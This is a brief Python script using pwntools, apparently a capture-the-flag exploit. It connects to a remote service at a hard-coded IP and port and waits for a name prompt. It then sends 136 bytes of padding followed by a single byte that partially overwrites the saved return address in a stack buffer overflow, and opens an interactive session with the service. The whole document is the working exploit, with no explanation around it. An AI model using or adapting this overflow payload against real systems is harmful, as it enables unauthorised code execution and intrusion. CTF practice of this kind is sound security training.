from pwn import *
from ctypes import *

io = remote('45.76.91.112', 10071)
io.recvuntil(b'What is your name?')

junk_length = 128 + 8
junk = bytes('a' * junk_length, 'utf-8')

least_significant_byte_of_ret = b'\x40'
input = junk + least_significant_byte_of_ret

io.send(input)
io.interactive()
